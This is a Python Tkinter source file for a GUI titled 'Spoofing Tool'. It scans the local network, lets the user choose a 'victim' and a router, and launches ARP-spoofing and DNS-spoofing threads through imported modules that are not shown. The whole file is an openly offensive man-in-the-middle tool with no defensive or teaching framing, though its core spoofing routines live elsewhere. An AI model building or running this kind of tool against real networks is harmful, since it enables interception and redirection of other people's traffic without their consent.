from Tkinter import *
import ttk as t
import scanning as scan
import dns as d
import threading


def scanNetworklist():
    networklist= scan.network_scanning()
    return networklist


def scanOpenUsers():
    network = networkChoice.get()
    networkSplit = network.split(', ')
    ipList = scan.ip_scanning(networkSplit)
    return ipList


def get_ips():
    ipList = scanOpenUsers()
    ipList = [', '.join(i[::-1]) for i in ipList]
    w2["state"] = "normal"
    w3["state"] = "normal"
    e["state"] = "normal"
    w2["values"] = ipList
    w3["values"] = ipList


def spoof(so, allo):
    s = so
    all = allo
    victim = w2.get()
    router = w3.get()
    victimMACip = victim.split(', ')
    routerMACip = router.split(', ')
    number = 0
    if (all != "all out") and s:
        number = int(e.get())

    if s:
        arps = threading.Thread(target=scan.arp_spoofing, args=(routerMACip[0], routerMACip[1], victimMACip[0], victimMACip[1], s, number, all))
        arps.start()
    elif not s:
        scan.put_qu("stop arp")
        scan.arp_spoofing(routerMACip[0], routerMACip[1], victimMACip[0], victimMACip[1], s, number, all)


def dns(start):
    network = networkChoice.get()
    networkSplit = network.split(', ')
    interface = networkSplit[1]
    if start:
        dnss = threading.Thread(target=d.dns_spoof, args=(interface,))
        dnss.start()
    elif not start:
        d.put_q("stop")


def prints():
    number = e.get()
    print(number)


screen = Tk()
screen.title("Spoofing Tool")

ipList =["non yet"]

scanningtext = Label(screen, text="Scanning",bg="black", fg="white", width=20)
scanningtext.grid(row=0, column=0, columnspan=1)
selectNText = Label(screen, text="Select network:")
selectNText.grid(row=1, column=0)
networkChoice = StringVar(screen)
networkChoice.set(scanNetworklist()[0]) # default value
w = OptionMenu(screen, networkChoice, *scanNetworklist())
w.grid(row=1, column=1, columnspan=1)
scanOpenButton = Button(screen, text="Scan for addresses", command=get_ips)
scanOpenButton.grid(row=2, column=0, columnspan=2)


iptext = Label(screen, text="Selecting IP adresses", bg="black", fg="white", width=20)
iptext.grid(row=3, column=0, columnspan=1)
selectIPText = Label(screen, text="Select victim:")
selectIPText.grid(row=4, column=0)
w2 = t.Combobox(screen, values=ipList[0], width=50, state=DISABLED)
w2.grid(row=4, column=1, columnspan=1)
selectRouterText = Label(screen, text="Select router:")
selectRouterText.grid(row=5, column=0)
w3 = t.Combobox(screen, values=ipList[0], width=50, state=DISABLED)
w3.grid(row=5, column=1, columnspan=1)

arptext = Label(screen, text="Arp Spoofing", bg="black", fg="white", width=20)
arptext.grid(row=6, column=0)
spoofbutton = Button(screen, text="Custom Spoof!", command=lambda: spoof(True, "0"))
spoofbutton.grid(row=7, column=0)
allButton = Button(screen, text="All Out Spoof!", command=lambda: spoof(True, "all out"))
allButton.grid(row=8, column=0)
amount = Label(screen, text="(<- Amount to be sent)")
amount.grid(row=7, column=2)
e = Entry(screen, state=DISABLED)
e.grid(row=7, column=1)
restorebutton = Button(screen, text="Restore ARP", command=lambda: spoof(False, "0"))
restorebutton.grid(row=8, column=1)

dnsLabel = Label(screen, text="DNS Spoofing", bg="black", fg="white", width=20)
dnsLabel.grid(row=9, column=0, columnspan=1)
DNSspoofbutton = Button(screen, text="DNS Spoof!", command=lambda: dns(True), pady=5)
DNSspoofbutton.grid(row=10, column=0)
DNSstopbutton = Button(screen, text="Stop DNS", command=lambda: dns(False))
DNSstopbutton.grid(row=10, column=1)


screen.mainloop()

